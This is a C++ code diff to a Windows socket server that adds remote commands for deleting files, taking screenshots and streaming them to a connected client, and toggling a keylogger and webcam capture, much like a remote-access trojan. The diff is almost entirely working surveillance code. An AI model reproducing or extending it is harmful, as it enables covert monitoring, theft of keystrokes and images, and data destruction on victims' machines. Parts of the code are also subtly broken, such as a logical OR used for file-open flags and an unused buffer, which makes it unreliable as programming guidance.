@@ -18,10 +18,10 @@ void CloseWinsock() {
 	initWinsock = false;
 }
 void ServerSocket::ProcessClientMessage() {
-	//When result == "U"?
+	//When result == "N"?
 	int query = 0;
 	int index = 0;
-	while (buffer[index] <= '9' && buffer[index] >= '0') {
+	while (buffer[index] != '\0' && buffer[index] <= '9' && buffer[index] >= '0') {
 		query = query * 10 + buffer[index] - '0';
 		index++;
 	}
@@ -43,19 +43,62 @@ void ServerSocket::ProcessClientMessage() {
 			send(clientSocket, buffer, sizeof(buffer), 0);
 		}
 	}
-	if (query == 17) {
+	else if (query == 17) {
 		//How to send message to client, admin after Shut down?
 		ShutdownSystem();
-		result = "C";
+		result = "Y";
 	}
 	else if (query == 18) {
 		//How to send message to client, admin after Reset?
 		ResetSystem();
-		result = "C";
+		result = "Y";
 	}
-	if (query == 23) {
+	else if (query == 21) {
+		string filePath = "";
+		while (buffer[index] != '\0') {
+			filePath += buffer[index];
+			index++;
+		}
+		if (DeleteFile(filePath)) {
+			result = "Y";
+		}
+		else {
+			result = "N";
+		}
+	}
+	else if (query == 22) {
+		if (CaptureScreen()) {
+			fstream file("_Data/screenshot.jpg", ios::binary || ios::in);
+			file.seekg(0, ios::end);
+			size_t fileSize = file.tellg();
+			file.seekg(0, ios::beg);
+			result = "F" + to_string(fileSize);
+			Send();
+			char fileBuffer[maxBufferSize];
+			while (file) {
+				file.read(buffer, sizeof(buffer));
+				send(clientSocket, buffer, sizeof(buffer), 0);
+			}
+		}
+		else {
+			result = "N";
+		}
+	}
+	else if (query == 23) {
 		isKeyloggerOn = true;
-		result = "C";
+		result = "Y";
+	}
+	else if (query == 26) {
+		isWebcamOn = true;
+		result = "Y";
+	}
+	else if (query == 27) {
+		isKeyloggerOn = false;
+		result = "Y";
+	}
+	else if (query == 28) {
+		isWebcamOn = false;
+		result = "Y";
 	}
 }
 ServerSocket::ServerSocket() {
@@ -63,7 +106,7 @@ ServerSocket::ServerSocket() {
 	isWebcamOn = false;
 	isServerOn = true;
 	keyloggerThread = thread(Keylogger, ref(isKeyloggerOn), ref(isServerOn));
-	//webcamThread = thread(Webcam, ref(isWebcamOn), ref(isServerOn));
+	webcamThread = thread(Webcam, ref(isWebcamOn), ref(isServerOn));
 	GetServerAddrInfo();
 	listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
